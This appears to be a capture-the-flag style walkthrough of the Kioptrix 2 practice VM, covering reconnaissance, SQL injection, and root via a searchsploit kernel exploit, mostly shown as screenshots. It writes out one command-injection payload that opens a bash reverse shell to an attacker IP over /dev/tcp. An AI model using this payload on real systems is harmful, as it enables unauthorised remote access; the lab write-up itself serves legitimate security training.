# Information gatharing
netdiscover -r 192.168.1.0/24

![image](https://user-images.githubusercontent.com/24206178/154660853-b0398231-8180-4cb9-ac52-7c60bb638c33.png)

![image](https://user-images.githubusercontent.com/24206178/154660890-7524e5cd-4418-4983-af83-78eb06e52feb.png)

Port 80 is open, lets check the website

![image](https://user-images.githubusercontent.com/24206178/154660923-7c2048cd-ef0e-4012-9b1d-d94f5d02fa8c.png)

There is a web site so, there is Nikto

![image](https://user-images.githubusercontent.com/24206178/154661080-3e175915-5734-48a3-875b-ac1e2828f04d.png)

![image](https://user-images.githubusercontent.com/24206178/154661102-194f6c38-00ee-409e-88a2-151b18414017.png)

lets go to the web page and play around

# Exploit

Try sql injection

![image](https://user-images.githubusercontent.com/24206178/154661247-0bd41d46-47f1-41f9-9735-b6f121fdce36.png)

![image](https://user-images.githubusercontent.com/24206178/154661260-14b21347-e24c-4c1b-8b5e-9baaacf063ed.png)


It Works!
; bash -i >& /dev/tcp/192.168.1.3/443 0>&1

![image](https://user-images.githubusercontent.com/24206178/154661282-736fd655-3b59-4d1c-901f-00d9706f0f84.png)

Before hit submit, you should open a listner in your machine using netcat

![image](https://user-images.githubusercontent.com/24206178/154661308-e21d1fdb-3ec3-4743-b159-4659bbc73bf0.png)

![image](https://user-images.githubusercontent.com/24206178/154661345-e7590e29-9f20-4bcc-b83e-9de213737edf.png)


![image](https://user-images.githubusercontent.com/24206178/154661360-17e9fd03-ecd7-4847-bfe1-9729af0c52a4.png)

![image](https://user-images.githubusercontent.com/24206178/154661372-a720404f-beb2-46e7-9157-4145fd1fa1f4.png)

![image](https://user-images.githubusercontent.com/24206178/154661385-2538c596-c571-4429-8149-a118da55adea.png)

We now want to be root

lets try to find a vulnarability using the information we gathered so far

We will use searchsploit

![image](https://user-images.githubusercontent.com/24206178/154661468-e76b9b53-1adb-4913-a941-2e743fe8aa62.png)

the option -w is for display the URL of the exploit in the exploitdb

![image](https://user-images.githubusercontent.com/24206178/154661486-404fd475-a1a1-4d16-9ec7-e017fcf95441.png)

Now lets try to use this

![image](https://user-images.githubusercontent.com/24206178/154661432-a648bcb9-0706-40ec-8721-4835d494b45b.png)

First find it in our local machine

![image](https://user-images.githubusercontent.com/24206178/154661514-20408878-d1b2-4ea8-939e-f07883244d00.png)

Lets create a folder for Kioptrix_2

![image](https://user-images.githubusercontent.com/24206178/154661704-27e60a31-5fa2-469d-97a0-7c17b7c36c39.png)

copy the file there 

![image](https://user-images.githubusercontent.com/24206178/154661726-fcfa2e84-ff3b-477b-a256-f4c75dcbb67c.png)

now we will use SimpleHTTPServer 



Now we can go to out session and download the file

![image](https://user-images.githubusercontent.com/24206178/154661754-ff3e37d7-8a6a-4cbc-937d-3b268660963f.png)

first i try to download it and it faild

![image](https://user-images.githubusercontent.com/24206178/154661771-96fbb0df-11ff-4f86-9f5e-ab03e1a46e14.png)

so we need to download it from a place that have write permmion

let go to tmp and try again

![image](https://user-images.githubusercontent.com/24206178/154661809-90cb7b9d-fd62-4b55-881a-514d7be13133.png)

it works!

Now lets run the exploit

![image](https://user-images.githubusercontent.com/24206178/154661852-593b097f-9599-43cd-82a7-21cabda5755f.png)

![image](https://user-images.githubusercontent.com/24206178/154661868-b387d941-24c2-4c48-acb8-b8f4e075d3d7.png)

![image](https://user-images.githubusercontent.com/24206178/154661883-65799117-b90c-4688-8e94-364dd5918a27.png)

![image](https://user-images.githubusercontent.com/24206178/154661894-d8a21404-fa1f-41ea-999e-4aa2456686b0.png)

BINGO! We are root
